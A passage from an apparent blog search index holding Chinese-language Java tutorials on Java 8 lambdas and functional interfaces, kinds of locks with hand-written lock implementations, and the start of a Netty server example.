argument and returns no * result. Unlike most other functional interfaces, {@code Consumer} is expected * to operate via side-effects. * * 表示一个操作接受单一输入参数，无返回结果。 * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #accept(Object)}. * * @param &lt;T&gt; the type of the input to the operation * * @since 1.8 */@FunctionalInterfacepublic interface Consumer&lt;T&gt; { /** * Performs this operation on the given argument. * * @param t the input argument */ void accept(T t); /** * Returns a composed {@code Consumer} that performs, in sequence, this * operation followed by the {@code after} operation. If performing either * operation throws an exception, it is relayed to the caller of the * composed operation. If performing this operation throws an exception, * the {@code after} operation will not be performed. * * @param after the operation to perform after this operation * @return a composed {@code Consumer} that performs in sequence this * operation followed by the {@code after} operation * @throws NullPointerException if {@code after} is null */ default Consumer&lt;T&gt; andThen(Consumer&lt;? super T&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; { accept(t); after.accept(t); }; }} lambda 表达式的作用： lambda 表达式为 Java 添加了缺失的函数式编程特性，使我们能将函数当做一等公民看待。 在将函数作为一等公民的语言中，lambda 表达式的类型是函数。但在 Java 中，lambda 表达式是对象，它们必须依附于一类特别的对象（函数式接口）； Lambda 表达式的深入对于 lambda 表达式需要根据上下文来推断，我们并不知道 () -&gt; {} 是什么，不知道对应的参数，方法是什么，只用通过前面的 Cons 定义才知道。 @FunctionalInterfaceinterface Cons1 { void print1();}@FunctionalInterfaceinterface Cons2 { void print2();}/** * @Author: cuzz * @Date: 2019/8/11 16:13 * @Description: */public class Test2 { public static void main(String[] args) { Cons1 cons1 = () -&gt; {}; Cons2 cons2 = () -&gt; {}; System.out.println(cons1.getClass().getInterfaces()[0]); // interface com.cuzz.Cons1 System.out.println(cons2.getClass().getInterfaces()[0]); // interface com.cuzz.Cons2 }} 我们先看一个排序的例子： /** * @Author: cuzz * @Date: 2019/8/12 23:09 * @Description: 排序 */public class Test4 { public static void main(String[] args) { List&lt;String&gt; list = Arrays.asList(&quot;cuzz&quot;, &quot;faker&quot;, &quot;mlxg&quot;); Collections.sort(list, (String s1, String s2) -&gt; { return s2.compareTo(s1); }); // 1 Collections.sort(list, (s1, s2) -&gt; s2.compareTo(s1)); // 2 }} 从 1 到 2 简化了很多，修饰符 String 和 return 都可以省略。Java Lambda 表达式是一种匿名函数，它没有声明方法，也没有访问修饰符、返回值和名字。 Lambda 表达式作用： 传递行为，而不仅仅是值 提升抽象层次 API 重用性好 更加灵活 Lambda 基本语法： Java 中的 Lambda 表达式基本语法 如：(argument) -&gt; {body} 省略类型：(arg1, arg2, ...) -&gt; {body} 有类型：(type1 arg1, type2 arg2, ...) -&gt; {body} Lambda 示例说明 (int a, int b) -&gt; {return a + b;} () -&gt; System.out.println(&quot;hello world&quot;) (String s) -&gt; {System.out.println(s);} () -&gt; 42 () -&gt; {return &quot;cuzz&quot;}; Lambda结构 一个 Lambda 表达式可以有零个或多个参数 参数的类型既可以明确声明，也可以根据上下文来推断，如：(int a) 与 (a) 效果相同 所有的参数需包含在圆括号内，参数之间用逗号相隔。如：(a, b) 或 (String a, int b float c) 空圆括号表示参数集为空，如：() -&gt; 42 当只有一个参数，且其类型可推导时，圆括号可以省略，如：a -&gt; return a * a Lambda 表达式的主题可以包含零条或多条语句 如果 Lambda 表达式的主体只有一条语句，花括号可以省略，匿名函数的返回类型与该主体表达式一致 如果 Lambda 表达式的主体包含一条以上语句，表达式必须使用花括号 Function直接先看源码 /** * Represents a function that accepts one argument and produces a result. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #apply(Object)}. * * @param &lt;T&gt; the type of the input to the function * @param &lt;R&gt; the type of the result of the function * * @since 1.8 */@FunctionalInterfacepublic interface Function&lt;T, R&gt; { /** * Applies this function to the given argument. * * @param t the function argument * @return the function result */ R apply(T t); default &lt;V&gt; Function&lt;V, R&gt; compose(Function&lt;? super V, ? extends T&gt; before) { Objects.requireNonNull(before); return (V v) -&gt; apply(before.apply(v)); } default &lt;V&gt; Function&lt;T, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; after.apply(apply(t)); } /** * Returns a function that always returns its input argument. * * @param &lt;T&gt; the type of the input and output objects to the function * @return a function that always returns its input argument */ static &lt;T&gt; Function&lt;T, T&gt; identity() { return t -&gt; t; }} 可以看出 Function 有一个抽象方法和两个默认方法以及一个静态方法。 （1） Function#apply Stream#map 里就是接受一个 Function，对于 Function 意思就是从一个映射到另一个。下面例子就是把字符串映射到大写。对于 String::toUpperCase 使用的是方法引用。 /** * @Author: cuzz * @Date: 2019/8/11 23:13 * @Description: */public class Test3 { public static void main(String[] args) { List&lt;String&gt; list = Arrays.asList(&quot;cuzz&quot;, &quot;faker&quot;, &quot;mlxg&quot;); list.stream().map(item -&gt; item.toUpperCase()).forEach(item -&gt; System.out.println(item)); list.stream().map(String::toUpperCase).forEach(System.out::println); Function&lt;String, String&gt; function = String::toUpperCase; System.out.println(function.getClass()); }} 我们看一个例子： /** * @Author: cuzz * @Date: 2019/8/13 0:08 * @Description: */public class FunctionTest { public static void main(String[] args) { FunctionTest function= new FunctionTest(); int res1 = function.compute(100, target -&gt; target * target); int res2 = function.compute(100, target -&gt; target + 1); System.out.println(res1); // 10000 System.out.println(res2); // 101 int res3 = function.pow(100); int res4 = function.addOne(100); System.out.println(res3); // 10000 System.out.println(res4); // 101 } public int compute(int a, Function&lt;Integer, Integer&gt; function) { return function.apply(a); } public int pow(int a) { return a * a; } public int addOne(int a) { return a + 1; }} 看看 #compute 这个方法，第二个参数传递的是行为，而不是具体的值。 我们本来要定义两个方法，pow 和 addOne 现在把这种行为传递进来。 （2）Function#compose 和 Function#andThen /** * Returns a composed function that first applies the {@code before} * function to its input, and then applies this function to the result. * If evaluation of either function throws an exception, it is relayed to * the caller of the composed function. * * @param &lt;V&gt; the type of input to the {@code before} function, and to the * composed function * @param before the function to apply before this function is applied * @return a composed function that first applies the {@code before} * function and then applies this function * @throws NullPointerException if before is null * * @see #andThen(Function) */default &lt;V&gt; Function&lt;V, R&gt; compose(Function&lt;? super V, ? extends T&gt; before) { Objects.requireNonNull(before); return (V v) -&gt; apply(before.apply(v));}/** * Returns a composed function that first applies this function to * its input, and then applies the {@code after} function to the result. * If evaluation of either function throws an exception, it is relayed to * the caller of the composed function. * * @param &lt;V&gt; the type of output of the {@code after} function, and of the * composed function * @param after the function to apply after this function is applied * @return a composed function that first applies this function and then * applies the {@code after} function * @throws NullPointerException if after is null * * @see #compose(Function) */default &lt;V&gt; Function&lt;T, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; after.apply(apply(t));} compose方法是一个默认方法，这个方法接收一个 function 作为参数，将参数 function 执行的结果作为参数给调用的 function，以此来实现两个function组合的功能。 andThen 方法也是接收一个 function 作为参数，与 compse 不同的是，先执行本身的 apply 方法，将执行的结果作为参数给参数中的 function。 /** * @Author: cuzz * @Date: 2019/8/20 23:59 * @Description: #compose and #andThen test */public class FunctionTest2 { public static void main(String[] args) { FunctionTest2 test = new FunctionTest2(); System.out.println(test.compute1(2, value -&gt; value * 2, value -&gt; value * value)); // 8 System.out.println(test.compute2(2, value -&gt; value * 2, value -&gt; value * value)); // 16 } public int compute1(int a, Function&lt;Integer, Integer&gt; function1, Function&lt;Integer, Integer&gt; function2) { return function1.compose(function2).apply(a); } public int compute2(int a, Function&lt;Integer, Integer&gt; function1, Function&lt;Integer, Integer&gt; function2) { return function1.andThen(function2).apply(a); }} 发现 compute1 是先执行第二个 Function 再执行第一，compute2 相反。 BiFunction先看源码 /** * Represents a function that accepts two arguments and produces a result. * This is the two-arity specialization of {@link Function}. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #apply(Object, Object)}. * * @param &lt;T&gt; the type of the first argument to the function * @param &lt;U&gt; the type of the second argument to the function * @param &lt;R&gt; the type of the result of the function * * @see Function * @since 1.8 */@FunctionalInterfacepublic interface BiFunction&lt;T, U, R&gt; { /** * Applies this function to the given arguments. * * @param t the first function argument * @param u the second function argument * @return the function result */ R apply(T t, U u); /** * Returns a composed function that first applies this function to * its input, and then applies the {@code after} function to the result. * If evaluation of either function throws an exception, it is relayed to * the caller of the composed function. * * @param &lt;V&gt; the type of output of the {@code after} function, and of the * composed function * @param after the function to apply after this function is applied * @return a composed function that first applies this function and then * applies the {@code after} function * @throws NullPointerException if after is null */ default &lt;V&gt; BiFunction&lt;T, U, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after) { Objects.requireNonNull(after); return (T t, U u) -&gt; after.apply(apply(t, u)); }} 我看一个例子 /** * @Author: cuzz * @Date: 2019/8/21 7:36 * @Description: */public class BiFunctionTest { public static void main(String[] args) { BiFunctionTest test = new BiFunctionTest(); // 加法 System.out.println(test.add(1, 2)); System.out.println(test.compute(1, 2, (a, b) -&gt; a + b)); // 减法 System.out.println(test.subtract(1, 2)); System.out.println(test.compute(1, 2, (a, b) -&gt; a - b)); } public int compute(int a, int b, BiFunction&lt;Integer, Integer, Integer&gt; biFunction) { return biFunction.apply(a, b); } public int add(int a, int b) { return a + b; } public int subtract(int a, int b) { return a - b; }} 以前我们定义一个四则运算需要需要先定义方法，现在通过 BiFunction 可以把这种行为传递进来。 Predicate（1）源码 /** * Represents a predicate (boolean-valued function) of one argument. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #test(Object)}. * * @param &lt;T&gt; the type of the input to the predicate * * @since 1.8 */@FunctionalInterfacepublic interface Predicate&lt;T&gt; { /** * Evaluates this predicate on the given argument. * * @param t the input argument * @return {@code true} if the input argument matches the predicate, * otherwise {@code false} */ boolean test(T t); /** * Returns a composed predicate that represents a short-circuiting logical * AND of this predicate and another. When evaluating the composed * predicate, if this predicate is {@code false}, then the {@code other} * predicate is not evaluated. * * &lt;p&gt;Any exceptions thrown during evaluation of either predicate are relayed * to the caller; if evaluation of this predicate throws an exception, the * {@code other} predicate will not be evaluated. * * @param other a predicate that will be logically-ANDed with this * predicate * @return a composed predicate that represents the short-circuiting logical * AND of this predicate and the {@code other} predicate * @throws NullPointerException if other is null */ default Predicate&lt;T&gt; and(Predicate&lt;? super T&gt; other) { Objects.requireNonNull(other); return (t) -&gt; test(t) &amp;&amp; other.test(t); } /** * Returns a predicate that represents the logical negation of this * predicate. * * @return a predicate that represents the logical negation of this * predicate */ default Predicate&lt;T&gt; negate() { return (t) -&gt; !test(t); } /** * Returns a composed predicate that represents a short-circuiting logical * OR of this predicate and another. When evaluating the composed * predicate, if this predicate is {@code true}, then the {@code other} * predicate is not evaluated. * * &lt;p&gt;Any exceptions thrown during evaluation of either predicate are relayed * to the caller; if evaluation of this predicate throws an exception, the * {@code other} predicate will not be evaluated. * * @param other a predicate that will be logically-ORed with this * predicate * @return a composed predicate that represents the short-circuiting logical * OR of this predicate and the {@code other} predicate * @throws NullPointerException if other is null */ default Predicate&lt;T&gt; or(Predicate&lt;? super T&gt; other) { Objects.requireNonNull(other); return (t) -&gt; test(t) || other.test(t); } /** * Returns a predicate that tests if two arguments are equal according * to {@link Objects#equals(Object, Object)}. * * @param &lt;T&gt; the type of arguments to the predicate * @param targetRef the object reference with which to compare for equality, * which may be {@code null} * @return a predicate that tests if two arguments are equal according * to {@link Objects#equals(Object, Object)} */ static &lt;T&gt; Predicate&lt;T&gt; isEqual(Object targetRef) { return (null == targetRef) ? Objects::isNull : object -&gt; targetRef.equals(object); }} （2）例子 以前我们根据不同的条件筛选数据需要些多个方法，现在只要先定义一个这种接受行为的方法。 /** * @Author: cuzz * @Date: 2019/8/21 23:35 * @Description: Predicate test */public class PredicateTest { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9); PredicateTest test = new PredicateTest(); // 查找奇数 test.findOdd(list); test.conditionFilter(list, i -&gt; i % 2 != 0); // 查找偶数 test.findEven(list); test.conditionFilter(list, i -&gt; i % 2 == 0); } public void conditionFilter(List&lt;Integer&gt; list, Predicate&lt;Integer&gt; predicate) { for (int i : list) { if (predicate.test(i)) { System.out.print(i + &quot; &quot;); } } System.out.println(); } public void findOdd(List&lt;Integer&gt; list) { for (int i : list) { if (i % 2 != 0) { System.out.print(i + &quot; &quot;); } } System.out.println(); } public void findEven(List&lt;Integer&gt; list) { for (int i : list) { if (i % 2 == 0) { System.out.print(i + &quot; &quot;); } } System.out.println(); }} （3）Predicate#and 和 Predicate#or public class PredicateTest { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9); PredicateTest test = new PredicateTest(); // 查找 大于 3 的奇数 test.conditionFilter2(list, i -&gt; i &gt; 3, i -&gt; i % 2 != 0); } public void conditionFilter2(List&lt;Integer&gt; list, Predicate&lt;Integer&gt; predicate1, Predicate&lt;Integer&gt; predicate2) { for (int i : list) { if (predicate1.and(predicate2).test(i)) { System.out.print(i + &quot; &quot;); } } System.out.println(); }} Supplier（1）不接受参数，返回一个值。 /** * Represents a supplier of results. * * &lt;p&gt;There is no requirement that a new or distinct result be returned each * time the supplier is invoked. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #get()}. * * @param &lt;T&gt; the type of results supplied by this supplier * * @since 1.8 */@FunctionalInterfacepublic interface Supplier&lt;T&gt; { /** * Gets a result. * * @return a result */ T get();} （2）例子 /** * @Author: cuzz * @Date: 2019/8/22 23:32 * @Description: */public class SupplierTest { public static void main(String[] args) { Supplier&lt;Student&gt; supplier1 = () -&gt; new Student(); Supplier&lt;Student&gt; supplier2 = Student::new; }}@Dataclass Student { private String name = &quot;cuzz&quot;; private int age = 20;} Optional参考： 使用 Java 8 Optional 的正确姿势","link":"/2019/08/11/Java8%E7%9A%84%E6%B7%B1%E5%85%A5%E4%B8%8E%E5%AE%9E%E6%88%98/"},{"title":"Java 中的锁","text":"Java中的锁分类在读很多并发文章中，会提及各种各样锁如公平锁，乐观锁等等，这篇文章介绍各种锁的分类。介绍的内容如下： 公平锁/非公平锁 可重入锁/不可重入锁 独享锁/共享锁 互斥锁/读写锁 乐观锁/悲观锁 分段锁 偏向锁/轻量级锁/重量级锁 自旋锁 上面是很多锁的名词，这些分类并不是全是指锁的状态，有的指锁的特性，有的指锁的设计，下面总结的内容是对每个锁的名词进行一定的解释。 公平锁/非公平锁是什么 公平锁：是指多个线程按照申请的顺序来获取值 非公平锁：是值多个线程获取值的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁，在高并发的情况下，可能会造成优先级翻转或者饥饿现象 两者区别 公平锁：在并发环境中，每一个线程在获取锁时会先查看此锁维护的等待队列，如果为空，或者当前线程是等待队列的第一个就占有锁，否者就会加入到等待队列中，以后会按照 FIFO 的规则获取锁 非公平锁：一上来就尝试占有锁，如果失败在进行排队 对于 Java ReentrantLock而言，通过构造函数指定该锁是否是公平锁，默认是非公平锁。非公平锁的优点在于吞吐量比公平锁大。 对于Synchronized而言，也是一种非公平锁。由于其并不像ReentrantLock是通过AQS的来实现线程调度，所以并没有任何办法使其变成公平锁。 可重入锁/不可重入锁最近正在阅读Java ReentrantLock源码，始终对可重入和不可重入概念理解不透彻，进行学习后记录在这里。 可重入锁：指的是同一个线程外层函数获得锁之后，内层仍然能获取到该锁，在同一个线程在外层方法获取锁的时候，在进入内层方法或会自动获取该锁 不可重入锁： 所谓不可重入锁，即若当前线程执行某个方法已经获取了该锁，那么在方法中尝试再次获取锁时，就会获取不到被阻塞 Java多线程的 wait() 方法和 notify() 方法。这两个方法是成对出现和使用的，要执行这两个方法，有一个前提就是，当前线程必须获其对象的monitor（俗称“锁”），否则会抛 IllegalMonitorStateException 异常，所以这两个方法必须在同步块代码里面调用。wait()：阻塞当前线程， notify()：唤起被wait()阻塞的线程。 手动实现一个可重入锁 public class ReentrantLock { boolean isLocked = false; Thread lockedBy = null; int lockedCount = 0; public synchronized void lock() throws InterruptedException { Thread thread = Thread.currentThread(); while (isLocked &amp;&amp; lockedBy != thread) { wait(); } isLocked = true; lockedCount++; lockedBy = thread; } public synchronized void unlock() { if (Thread.currentThread() == lockedBy) { lockedCount--; if (lockedCount == 0) { isLocked = false; notify(); } } }} 发现可以输出 ReentrantLock，我们设计两个线程调用 print() 方法，第一个线程调用 print() 方法获取锁，进入 lock() 方法，由于初始 lockedBy 是 null，所以不会进入 while 而挂起当前线程，而是是增量 lockedCount 并记录 lockBy 为第一个线程。接着第一个线程进入 doAdd() 方法，由于同一进程，所以不会进入 while 而挂起，接着增量 lockedCount，当第二个线程尝试lock，由于 isLocked=true，所以他不会获取该锁，直到第一个线程调用两次 unlock() 将 lockCount 递减为0，才将标记为 isLocked 设置为 false。 public class Count {// NotReentrantLock lock = new NotReentrantLock(); ReentrantLock lock = new ReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something System.out.println(&quot;ReentrantLock&quot;); lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 手动实现一个不可重入锁 public class NotReentrantLock { private boolean isLocked = false; public synchronized void lock() throws InterruptedException { while (isLocked) { wait(); } isLocked = true; } public synchronized void unlock() { isLocked = false; notify(); }} 测试 public class Count { NotReentrantLock lock = new NotReentrantLock(); public void print() throws InterruptedException{ lock.lock(); doAdd(); lock.unlock(); } private void doAdd() throws InterruptedException { lock.lock(); // do something lock.unlock(); } public static void main(String[] args) throws InterruptedException { Count count = new Count(); count.print(); }} 当前线程执行print()方法首先获取lock，接下来执行doAdd()方法就无法执行doAdd()中的逻辑，必须先释放锁。这个例子很好的说明了不可重入锁。 synchronized 和 ReentrantLock 都是可重入锁 synchronzied public class SynchronziedDemo { private synchronized void print() { doAdd(); } private synchronized void doAdd() { System.out.println(&quot;doAdd...&quot;); } public static void main(String[] args) { SynchronziedDemo synchronziedDemo = new SynchronziedDemo(); synchronziedDemo.print(); // doAdd... }} 上面可以说明 synchronized 是可重入锁。 ReentrantLock public class ReentrantLockDemo { private Lock lock = new ReentrantLock(); private void print() { lock.lock(); doAdd(); lock.unlock(); } private void doAdd() { lock.lock(); lock.lock(); System.out.println(&quot;doAdd...&quot;); lock.unlock(); lock.unlock(); } public static void main(String[] args) { ReentrantLockDemo reentrantLockDemo = new ReentrantLockDemo(); reentrantLockDemo.print(); }} 上面例子可以说明 ReentrantLock 是可重入锁，而且在 #doAdd 方法中加两次锁和解两次锁也可以。 可重入锁的概念和设计思想大体如此，Java 中的可重入锁 ReentrantLock 设计思路也是这样。 独享锁/共享锁是什么 独享锁是指该锁一次只能被一个线程所持有。 共享锁是指该锁可被多个线程所持有。 对于Java ReentrantLock而言，其是独享锁。但是对于Lock的另一个实现类ReadWriteLock，其读锁是共享锁，其写锁是独享锁。 读锁的共享锁可保证并发读是非常高效的，读写，写读 ，写写的过程是互斥的。 独享锁与共享锁也是通过AQS来实现的，通过实现不同的方法，来实现独享或者共享。 对于Synchronized而言，当然是独享锁。 读写锁例子 public class MyCache { private volatile Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); private ReentrantReadWriteLock lock = new ReentrantReadWriteLock(); WriteLock writeLock = lock.writeLock(); ReadLock readLock = lock.readLock(); public void put(String key, Object value) { try { writeLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在写入...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } map.put(key, value); System.out.println(Thread.currentThread().getName() + &quot; 写入完成，写入结果是 &quot; + value); } finally { writeLock.unlock(); } } public void get(String key) { try { readLock.lock(); System.out.println(Thread.currentThread().getName() + &quot; 正在读...&quot;); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } Object res = map.get(key); System.out.println(Thread.currentThread().getName() + &quot; 读取完成，读取结果是 &quot; + res); } finally { readLock.unlock(); } }} 测试 public class ReadWriteLockDemo { public static void main(String[] args) { MyCache cache = new MyCache(); for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.put(temp + &quot;&quot;, temp + &quot;&quot;); }).start(); } for (int i = 0; i &lt; 5; i++) { final int temp = i; new Thread(() -&gt; { cache.get(temp + &quot;&quot;); }).start(); } }} 输出结果 Thread-0 正在写入...Thread-0 写入完成，写入结果是 0Thread-1 正在写入...Thread-1 写入完成，写入结果是 1Thread-2 正在写入...Thread-2 写入完成，写入结果是 2Thread-3 正在写入...Thread-3 写入完成，写入结果是 3Thread-4 正在写入...Thread-4 写入完成，写入结果是 4Thread-5 正在读...Thread-7 正在读...Thread-8 正在读...Thread-6 正在读...Thread-9 正在读...Thread-5 读取完成，读取结果是 0Thread-7 读取完成，读取结果是 2Thread-8 读取完成，读取结果是 3Thread-6 读取完成，读取结果是 1Thread-9 读取完成，读取结果是 4 能保证读写、写读和写写的过程是互斥的时候是独享的，读读的时候是共享的。 互斥锁/读写锁上面讲的独享锁/共享锁就是一种广义的说法，互斥锁/读写锁就是具体的实现。 互斥锁在Java中的具体实现就是ReentrantLock 读写锁在Java中的具体实现就是ReadWriteLock 乐观锁/悲观锁乐观锁与悲观锁不是指具体的什么类型的锁，而是指看待并发同步的角度。 悲观锁认为对于同一个数据的并发操作，一定是会发生修改的，哪怕没有修改，也会认为修改。因此对于同一个数据的并发操作，悲观锁采取加锁的形式。悲观的认为，不加锁的并发操作一定会出问题。 乐观锁则认为对于同一个数据的并发操作，是不会发生修改的。在更新数据的时候，会采用尝试更新，不断重新的方式更新数据。乐观的认为，不加锁的并发操作是没有事情的。 从上面的描述我们可以看出，悲观锁适合写操作非常多的场景，乐观锁适合读操作非常多的场景，不加锁会带来大量的性能提升。 悲观锁在Java中的使用，就是利用各种锁。 乐观锁在Java中的使用，是无锁编程，常常采用的是CAS算法，典型的例子就是原子类，通过CAS自旋实现原子操作的更新。 分段锁分段锁其实是一种锁的设计，并不是具体的一种锁，对于ConcurrentHashMap 而言，其并发的实现就是通过分段锁的形式来实现高效的并发操作。 我们以ConcurrentHashMap来说一下分段锁的含义以及设计思想，ConcurrentHashMap中的分段锁称为Segment，它即类似于HashMap（JDK7与JDK8中HashMap的实现）的结构，即内部拥有一个Entry数组，数组中的每个元素又是一个链表；同时又是一个ReentrantLock（Segment继承了ReentrantLock)。 当需要put元素的时候，并不是对整个hashmap进行加锁，而是先通过 hashcode 来知道他要放在那一个分段中，然后对这个分段进行加锁，所以当多线程put的时候，只要不是放在一个分段中，就实现了真正的并行的插入。 但是，在统计size的时候，可就是获取 hashmap 全局信息的时候，就需要获取所有的分段锁才能统计。 分段锁的设计目的是细化锁的粒度，当操作不需要更新整个数组的时候，就仅仅针对数组中的一项进行加锁操作。 偏向锁/轻量级锁/重量级锁偏向锁 在没有实际竞争的情况下，还能够针对部分场景继续优化。如果不仅仅没有实际竞争，自始至终，使用锁的线程都只有一个，那么，维护轻量级锁都是浪费的。偏向锁的目标是，减少无竞争且只有一个线程使用锁的情况下，使用轻量级锁产生的性能消耗。轻量级锁每次申请、释放锁都至少需要一次CAS，但偏向锁只有初始化时需要一次CAS。 “偏向”的意思是，偏向锁假定将来只有第一个申请锁的线程会使用锁（不会有任何线程再来申请锁），因此，只需要在Mark Word中 CAS 记录owner（本质上也是更新，但初始值为空），如果记录成功，则偏向锁获取成功，记录锁状态为偏向锁，以后当前线程等于owner就可以零成本的直接获得锁；否则，说明有其他线程竞争，膨胀为轻量级锁。 偏向锁无法使用自旋锁优化，因为一旦有其他线程申请锁，就破坏了偏向锁的假定。 缺点： 同样的，如果明显存在其他线程申请锁，那么偏向锁将很快膨胀为轻量级锁。 不过这个副作用已经小的多。 如果需要，使用参数-XX:-UseBiasedLocking禁止偏向锁优化（默认打开）。 轻量级锁 自旋锁的目标是降低线程切换的成本。如果锁竞争激烈，我们不得不依赖于重量级锁，让竞争失败的线程阻塞；如果完全没有实际的锁竞争，那么申请重量级锁都是浪费的。轻量级锁的目标是，减少无实际竞争情况下，使用重量级锁产生的性能消耗，包括系统调用引起的内核态与用户态切换、线程阻塞造成的线程切换等。 顾名思义，轻量级锁是相对于重量级锁而言的。使用轻量级锁时，不需要申请互斥量，仅仅将 Mark Word 中的部分字节CAS更新指向线程栈中的Lock Record，如果更新成功，则轻量级锁获取成功，记录锁状态为轻量级锁；否则，说明已经有线程获得了轻量级锁，目前发生了锁竞争（不适合继续使用轻量级锁），接下来膨胀为重量级锁。 Mark Word是对象头的一部分；每个线程都拥有自己的线程栈（虚拟机栈），记录线程和函数调用的基本信息。二者属于JVM的基础内容，此处不做介绍。 当然，由于轻量级锁天然瞄准不存在锁竞争的场景，如果存在锁竞争但不激烈，仍然可以用自旋锁优化，自旋失败后再膨胀为重量级锁。 重量级锁 内置锁在Java中被抽象为监视器锁（monitor）。在JDK 1.6之前，监视器锁可以认为直接对应底层操作系统中的互斥量（mutex）。这种同步方式的成本非常高，包括系统调用引起的内核态与用户态切换、线程阻塞造成的线程切换等。因此，后来称这种锁为“重量级锁”。 偏向锁、轻量级锁、重量级锁分配和膨胀的详细过程见后。会涉及一些Mark Word与CAS的知识。 偏向锁、轻量级锁、重量级锁适用于不同的并发场景： 偏向锁：无实际竞争，且将来只有第一个申请锁的线程会使用锁。 轻量级锁：无实际竞争，多个线程交替使用锁；允许短时间的锁竞争。 重量级锁：有实际竞争，且锁竞争时间长。 另外，如果锁竞争时间短，可以使用自旋锁进一步优化轻量级锁、重量级锁的性能，减少线程切换。 如果锁竞争程度逐渐提高（缓慢），那么从偏向锁逐步膨胀到重量锁，能够提高系统的整体性能。 自旋锁首先，内核态与用户态的切换上不容易优化。但通过自旋锁，可以减少线程阻塞造成的线程切换（包括挂起线程和恢复线程）。 如果锁的粒度小，那么锁的持有时间比较短（尽管具体的持有时间无法得知，但可以认为，通常有一部分锁能满足上述性质）。那么，对于竞争这些锁的而言，因为锁阻塞造成线程切换的时间与锁持有的时间相当，减少线程阻塞造成的线程切换，能得到较大的性能提升。具体如下： 当前线程竞争锁失败时，打算阻塞自己 不直接阻塞自己，而是自旋（空等待，比如一个空的有限for循环）一会 在自旋的同时重新竞争锁 如果自旋结束前获得了锁，那么锁获取成功；否则，自旋结束后阻塞自己 如果在自旋的时间内，锁就被旧owner释放了，那么当前线程就不需要阻塞自己（也不需要在未来锁释放时恢复），减少了一次线程切换。 “锁的持有时间比较短“这一条件可以放宽。实际上，只要锁竞争的时间比较短（比如线程1快释放锁的时候，线程2才会来竞争锁），就能够提高自旋获得锁的概率。这通常发生在锁持有时间长，但竞争不激烈的场景中。 手动实现自旋锁 public class SpinLock { private AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;&gt;(); private void lock () { System.out.println(Thread.currentThread() + &quot; coming...&quot;); while (!atomicReference.compareAndSet(null, Thread.currentThread())) { // loop } } private void unlock() { Thread thread = Thread.currentThread(); atomicReference.compareAndSet(thread, null); System.out.println(thread + &quot; unlock...&quot;); } public static void main(String[] args) throws InterruptedException { SpinLock spinLock = new SpinLock(); new Thread(() -&gt; { spinLock.lock(); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;hahaha&quot;); spinLock.unlock(); }).start(); Thread.sleep(1); new Thread(() -&gt; { spinLock.lock(); System.out.println(&quot;hehehe&quot;); spinLock.unlock(); }).start(); }} 输出： Thread[Thread-0,5,main] coming...Thread[Thread-1,5,main] coming...hahahaThread[Thread-0,5,main] unlock...heheheThread[Thread-1,5,main] unlock... 获取锁的时候，如果原子引用为空就获取锁，不为空表示有人获取了锁，就循环等待。 典型的自旋锁实现的例子，可以参考自旋锁的实现 锁分配和膨胀过程 参考链接 Java中的锁分类 Java不可重入锁和可重入锁理解 浅谈偏向锁、轻量级锁、重量级锁","link":"/2019/02/13/Java%E4%B8%AD%E7%9A%84%E9%94%81/"},{"title":"Netty 源码分析（一）","text":"版本 4.1.15 官网：https://netty.io/ Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp; clients. 先看一个例子服务端MyServer 类 /** * @Author: cuzz * @Date: 2019/1/1 19:44 * @Description: */public class MyServer { public static void main(String[] args) throws InterruptedException { EventLoopGroup bossGroup = new NioEventLoopGroup(); EventLoopGroup workGroup = new NioEventLoopGroup(); try { ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new MyServerinitializer()); ChannelFuture channelFuture = bootstrap.bind(8899).sync(); channelFuture.channel().closeFuture().sync(); } finally { bossGroup.shutdownGracefully(); bossGroup.shutdownGracefully(); } }} MyServerinitializer 类 /** * @Author: cuzz * @Date: 2019/1/1 20:06 * @Description: */public class MyServerinitializer extends ChannelInitializer&lt;SocketChannel&gt; { @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4)); pipeline.addLast(new LengthFieldPrepender(4)); pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8)); pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8)); pipeline.addLast(new MyServerHandler()); }} MyServerHandler 类 /** * @Author: cuzz * @Date: 2019/1/1 20:23 * @Description: */public class MyServerHandler extends SimpleChannelInboundHandler&lt;String&gt;{ @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception { System.out.println(ctx.channel().remoteAddress() + &quot;: &quot; + msg); 